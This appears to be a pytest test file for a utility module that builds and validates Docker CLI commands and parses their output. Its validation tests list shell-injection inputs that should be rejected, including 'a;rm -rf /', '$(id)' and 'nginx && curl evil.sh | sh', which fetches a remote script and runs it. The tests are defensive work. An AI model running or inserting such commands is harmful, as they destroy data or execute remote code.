"""Command building and output parsing for the Docker tab (no Qt needed)."""

import shlex

import pytest

import docker_utils as du


# ── validation ────────────────────────────────────────────────

@pytest.mark.parametrize("value", ["web", "my-app_1", "a.b-c", "3f2a9c1d7e44", "Web_01"])
def test_valid_names(value):
    assert du.validate_name(value) == value


@pytest.mark.parametrize("value", [
    "", "  ", "-rf", "a b", "a;rm -rf /", "$(id)", "a`id`", "x|y", "a&b", "a\nb", "x" * 600,
])
def test_invalid_names_rejected(value):
    with pytest.raises(ValueError):
        du.validate_name(value)


@pytest.mark.parametrize("value", [
    "nginx", "nginx:1.27", "ghcr.io/owner/app:v1", "registry:5000/team/app@sha256:abc123",
    "sha256:0123456789abcdef", "0123456789ab",
])
def test_valid_image_refs(value):
    assert du.validate_image_ref(value) == value


@pytest.mark.parametrize("value", ["", "-v /:/host", "nginx; id", "a b", "$(x)", "im\ng"])
def test_invalid_image_refs_rejected(value):
    with pytest.raises(ValueError):
        du.validate_image_ref(value)


# ── command construction ──────────────────────────────────────

def test_list_commands_use_json_format():
    for kind in ("containers", "images", "volumes", "networks"):
        cmd = du.list_command(kind)
        assert cmd.startswith("docker ")
        assert shlex.split(cmd)[-1] == "{{json .}}"


def test_list_command_unknown_kind():
    with pytest.raises(ValueError):
        du.list_command("secrets")


def test_container_actions():
    assert du.container_action_command("restart", "web") == "docker restart web"
    with pytest.raises(ValueError):
        du.container_action_command("exec", "web")
    with pytest.raises(ValueError):
        du.container_action_command("stop", "web; id")


def test_remove_commands():
    assert du.remove_container_command("web") == "docker rm web"
    assert du.remove_container_command("web", force=True) == "docker rm -f web"
    assert du.remove_image_command("nginx:1.27") == "docker rmi nginx:1.27"
    assert du.remove_volume_command("data") == "docker volume rm data"
    assert du.remove_network_command("backend") == "docker network rm backend"


def test_pull_command_validates():
    assert du.pull_command("nginx:latest") == "docker pull nginx:latest"
    with pytest.raises(ValueError):
        du.pull_command("nginx && curl evil.sh | sh")


def test_logs_command_options():
    cmd = du.logs_command("web", tail=50, follow=True, timestamps=True)
    assert cmd == "docker logs --tail 50 -t -f web 2>&1"
    assert "--tail 100000" in du.logs_command("web", tail=10**9)
    assert "--tail 1 " in du.logs_command("web", tail=0)


def test_exec_command_quotes_user_text_as_single_argument():
    cmd = du.exec_command("web", "ls -la /tmp; echo 'hi'")
    parts = shlex.split(cmd.replace(" 2>&1", ""))
    assert parts[:4] == ["docker", "exec", "web", "sh"]
    assert parts[4] == "-c"
    assert parts[5] == "ls -la /tmp; echo 'hi'"


def test_exec_command_rejects_empty_and_bad_container():
    with pytest.raises(ValueError):
        du.exec_command("web", "   ")
    with pytest.raises(ValueError):
        du.exec_command("web;id", "ls")


def test_inspect_commands():
    assert du.inspect_command("containers", "web") == "docker inspect web"
    assert du.inspect_command("images", "nginx:1.27") == "docker inspect nginx:1.27"
    assert du.inspect_command("volumes", "data") == "docker volume inspect data"
    assert du.inspect_command("networks", "backend") == "docker network inspect backend"
    with pytest.raises(ValueError):
        du.inspect_command("secrets", "x")


# ── output parsing ────────────────────────────────────────────

def test_volume_and_network_details_are_batched():
    volume = du.details_command("volumes")
    network = du.details_command("networks")
    assert "docker volume inspect --format" in volume
    assert "docker volume ls -q" in volume
    assert "docker network inspect --format" in network
    assert "docker network ls -q" in network
    with pytest.raises(ValueError):
        du.details_command("containers")


def test_stats_command_uses_single_json_lines_snapshot():
    command = du.stats_command()
    assert command.startswith("docker stats --no-stream --format ")
    assert "{{json .}}" in command


def test_parse_json_lines_skips_noise():
    text = (
        "WARNING: something from the CLI\n"
        '{"ID":"abc","Names":"web","State":"running"}\n'
        "\n"
        "sudo: unable to resolve host\n"
        "{not json}\n"
        '{"ID":"def","Names":"db","State":"exited"}\n'
        "[1, 2]\n"
    )
    rows = du.parse_json_lines(text)
    assert [r["Names"] for r in rows] == ["web", "db"]


def test_parse_json_lines_empty():
    assert du.parse_json_lines("") == []
    assert du.parse_json_lines(None) == []


def test_cell_and_image_display_ref():
    assert du.cell({"a": None}, "a") == ""
    assert du.cell({}, "a") == ""
    assert du.cell({"a": 5}, "a") == "5"
    assert du.image_display_ref({"Repository": "nginx", "Tag": "1.27", "ID": "x"}) == "nginx:1.27"
    assert du.image_display_ref({"Repository": "nginx", "Tag": "<none>", "ID": "x"}) == "nginx"
    assert du.image_display_ref({"Repository": "<none>", "Tag": "<none>", "ID": "sha256:ab"}) == "sha256:ab"


# ── error classification / state mapping ──────────────────────

@pytest.mark.parametrize("stderr,code,expected", [
    ("bash: docker: command not found", 127, "not installed"),
    ("permission denied while trying to connect to the Docker daemon socket at "
     "unix:///var/run/docker.sock", 1, "docker' group"),
    ("Cannot connect to the Docker daemon at unix:///var/run/docker.sock. "
     "Is the docker daemon running?", 1, "not running"),
    ("", 3, "status 3"),
])
def test_classify_error(stderr, code, expected):
    assert expected in du.classify_error(stderr, code)


def test_classify_error_unknown_or_ok():
    assert du.classify_error("Error response from daemon: No such container: x", 1) is None
    assert du.classify_error("", 0) is None


@pytest.mark.parametrize("state,kind", [
    ("running", "running"), ("Running", "running"), ("paused", "paused"),
    ("exited", "stopped"), ("created", "stopped"), ("dead", "stopped"),
    ("restarting", "other"), ("", "other"),
])
def test_state_kind(state, kind):
    assert du.state_kind(state) == kind


# ── local resource sorting ────────────────────────────────────

def test_sort_resources_uses_natural_case_insensitive_order_and_keeps_missing_last():
    rows = [
        {"Names": "app10"}, {"Names": "App2"}, {"Names": "app1"}, {"Names": ""},
    ]
    assert [r["Names"] for r in du.sort_resources(rows, "containers", "name")] == [
        "app1", "App2", "app10", ""
    ]
    assert [r["Names"] for r in du.sort_resources(rows, "containers", "name", True)] == [
        "app10", "App2", "app1", ""
    ]


def test_sort_resources_handles_state_and_missing_metadata():
    rows = [{"State": "running"}, {"State": "Exited"}, {}, {"State": "paused"}]
    assert [r.get("State") for r in du.sort_resources(rows, "containers", "state")] == [
        "Exited", "paused", "running", None
    ]


def test_image_size_sort_is_numeric_not_display_text():
    rows = [{"Size": "900MB"}, {"Size": "1.2GB"}, {"Size": "64KB"}, {"Size": ""}]
    sorted_rows = du.sort_resources(rows, "images", "size")
    assert [r.get("Size") for r in sorted_rows] == ["64KB", "900MB", "1.2GB", ""]


def test_image_created_sort_uses_exact_timestamp_and_keeps_unknown_last():
    rows = [
        {"CreatedAt": "2025-01-01 00:00:00 +0000 UTC"},
        {"CreatedAt": "2026-01-01 00:00:00 +0000 UTC"},
        {"CreatedAt": ""},
    ]
    assert [r["CreatedAt"] for r in du.sort_resources(rows, "images", "created")] == [
        "2025-01-01 00:00:00 +0000 UTC", "2026-01-01 00:00:00 +0000 UTC", ""
    ]


def _compose_row(name, project=None, service=None, state="running"):
    labels = []
    if project is not None:
        labels.append("com.docker.compose.project=" + project)
    if service is not None:
        labels.append("com.docker.compose.service=" + service)
    return {"ID": name + "-id", "Names": name, "State": state, "Labels": ",".join(labels)}


def test_compose_groups_split_projects_and_standalone_containers():
    rows = [
        _compose_row("web", "store", "web"),
        _compose_row("worker", "jobs", "worker", "exited"),
        _compose_row("db", "store", "db", "paused"),
        _compose_row("manual"),
    ]
    groups = du.compose_groups(rows)
    assert [group["name"] for group in groups] == ["jobs", "store", "Standalone containers"]
    assert [r["Names"] for r in groups[1]["containers"]] == ["web", "db"]
    assert groups[-1]["containers"][0]["Names"] == "manual"


def test_compose_grouping_requires_project_label_and_handles_dict_labels():
    rows = [
        {"Names": "partial", "Labels": "com.docker.compose.service=api"},
        {"Names": "labeled", "Labels": {
            "com.docker.compose.project": "actual", "com.docker.compose.service": "api"
        }},
    ]
    assert du.compose_groups(rows)[-1]["containers"][0]["Names"] == "partial"
    assert du.compose_metadata(rows[0]) == ("", "")
    assert du.compose_metadata(rows[1]) == ("actual", "api")


def test_compose_duplicate_service_names_remain_distinct_container_rows():
    rows = [_compose_row("api-1", "app", "api"), _compose_row("api-2", "app", "api")]
    assert [r["ID"] for r in du.compose_groups(rows)[0]["containers"]] == ["api-1-id", "api-2-id"]



# ── safe cleanup preview and selected cleanup commands ────────

def _marked_cleanup_output(stopped="", dangling="", images="", used="", builder=""):
    return "\n".join([
        "__KD_STOPPED_CONTAINERS__", stopped,
        "__KD_DANGLING_IMAGES__", dangling,
        "__KD_ALL_IMAGES__", images,
        "__KD_USED_IMAGE_IDS__", used,
        "__KD_BUILDER_CACHE__", builder,
    ])


def test_cleanup_preview_command_uses_read_only_commands_only():
    command = du.cleanup_preview_command()
    assert "docker ps -a -s" in command
    assert "docker images --filter dangling=true" in command
    assert "docker buildx du --verbose" in command
    assert "docker buildx prune" not in command
    assert "docker rm " not in command
    assert "docker image rm " not in command
    assert "docker volume rm " not in command
    assert "docker buildx prune" not in command


def test_cleanup_preview_handles_empty_candidate_lists():
    report = du.parse_cleanup_preview(_marked_cleanup_output())
    assert all(category["available"] for category in report.values())
    assert all(category["items"] == [] for category in report.values())
    assert "Nothing has been removed" in du.format_cleanup_preview(report)


def test_cleanup_preview_parses_mixed_candidates_and_missing_sizes():
    stopped = '{"ID":"c123","Names":"old-worker","Size":"12MB"}'
    dangling = '{"ID":"sha256:' + "b" * 64 + '","Repository":"<none>","Tag":"<none>","Size":"24MB"}'
    unused_id = "sha256:" + "c" * 64
    used_id = "sha256:" + "a" * 64
    images = "\n".join([
        '{"ID":"' + unused_id + '","Repository":"unused","Tag":"v1","Size":"300MB"}',
        '{"ID":"' + unused_id + '","Repository":"unused-alias","Tag":"stable","Size":"300MB"}',
        '{"ID":"' + used_id + '","Repository":"nginx","Tag":"latest","Size":"100MB"}',
        '{"ID":"sha256:' + "b" * 64 + '","Repository":"<none>","Tag":"<none>","Size":"24MB"}',
        '{"ID":"sha256:' + "d" * 64 + '","Repository":"missing-size","Tag":"v1"}',
    ])
    builder = "ID: cache-one\nSize: 40MB\nReclaimable: true\n\nID: cache-two\nSize: 9MB\nReclaimable: false"
    report = du.parse_cleanup_preview(_marked_cleanup_output(
        stopped=stopped, dangling=dangling, images=images, used=used_id, builder=builder
    ))
    assert [item["name"] for item in report["stopped_containers"]["items"]] == ["old-worker"]
    assert len(report["dangling_images"]["items"]) == 1
    assert [item["ref"] for item in report["unused_images"]["items"]] == ["unused:v1", "missing-size:v1"]
    assert report["unused_images"]["items"][0]["refs"] == ["unused:v1", "unused-alias:stable"]
    assert len(report["build_cache"]["items"]) == 1
    assert report["build_cache"]["items"][0]["size_bytes"] == 40 * 1000 * 1000
    assert "upper-bound" in du.format_cleanup_preview(report)


def test_cleanup_preview_marks_unsupported_commands_and_permission_errors():
    report = du.parse_cleanup_preview(_marked_cleanup_output(
        stopped="permission denied while trying to connect to the Docker daemon",
        images="permission denied while trying to connect to the Docker daemon",
        builder="docker: unknown command: builder",
    ))
    assert not report["stopped_containers"]["available"]
    assert "permission denied" in report["stopped_containers"]["error"]
    assert not report["build_cache"]["available"]
    assert "unknown command" in report["build_cache"]["error"]
    assert not report["unused_images"]["available"]


def test_cleanup_commands_are_limited_to_selected_category_and_never_volumes():
    report = du.parse_cleanup_preview(_marked_cleanup_output(
        stopped='{"ID":"c123","Names":"old-worker"}',
        dangling='{"ID":"sha256:' + "b" * 64 + '","Repository":"<none>","Tag":"<none>"}',
        images='{"ID":"sha256:' + "c" * 64 + '","Repository":"unused","Tag":"v1"}',
        used="",
        builder="ID: cache-one\nSize: 40MB\nReclaimable: true",
    ))
    assert du.cleanup_command("stopped_containers", report) == "docker rm c123"
    assert du.cleanup_command("unused_images", report) == "docker image rm sha256:" + "c" * 64
    assert du.cleanup_command("dangling_images", report).startswith("docker image rm sha256:")
    assert du.cleanup_command("build_cache", report) == "docker buildx prune --force"
    with pytest.raises(ValueError):
        du.cleanup_command("volumes", report)


def test_cleanup_command_requires_candidates_and_safe_preview():
    report = du.parse_cleanup_preview(_marked_cleanup_output())
    with pytest.raises(ValueError):
        du.cleanup_command("stopped_containers", report)
    broken = du.parse_cleanup_preview(_marked_cleanup_output(
        stopped="permission denied"
    ))
    with pytest.raises(ValueError):
        du.cleanup_command("stopped_containers", broken)




def test_buildx_preview_uses_reported_reclaimable_total_for_shared_layers():
    builder = (
        "ID: cache-a\nSize: 1GB\nReclaimable: true\nShared: false\n\n"
        "ID: cache-b\nSize: 800MB\nReclaimable: true\nShared: true\n\n"
        "Shared: 800MB\nPrivate: 700MB\nReclaimable: 1.5GB\nTotal: 1.5GB"
    )
    report = du.parse_cleanup_preview(_marked_cleanup_output(builder=builder))
    assert len(report["build_cache"]["items"]) == 2
    assert report["build_cache"]["reported_size_bytes"] == 1500 * 1000 * 1000
    summary = du.format_cleanup_preview(report)
    assert "1.5 GB" in summary


def test_volumes_and_networks_sort_by_name_driver_and_scope():
    volumes = [
        {"Name": "zeta", "Driver": "local", "Scope": "global"},
        {"Name": "Alpha", "Driver": "cifs", "Scope": "local"},
        {"Name": "beta", "Driver": "local", "Scope": "local"},
    ]
    assert [r["Name"] for r in du.sort_resources(volumes, "volumes", "name")] == [
        "Alpha", "beta", "zeta"
    ]
    assert [r["Driver"] for r in du.sort_resources(volumes, "volumes", "driver", True)] == [
        "local", "local", "cifs"
    ]
    networks = [
        {"Name": "backend", "Driver": "bridge", "Scope": "local"},
        {"Name": "frontend", "Driver": "overlay", "Scope": "swarm"},
    ]
    assert [r["Name"] for r in du.sort_resources(networks, "networks", "name", True)] == [
        "frontend", "backend"
    ]
    assert [r["Scope"] for r in du.sort_resources(networks, "networks", "scope")] == [
        "local", "swarm"
    ]
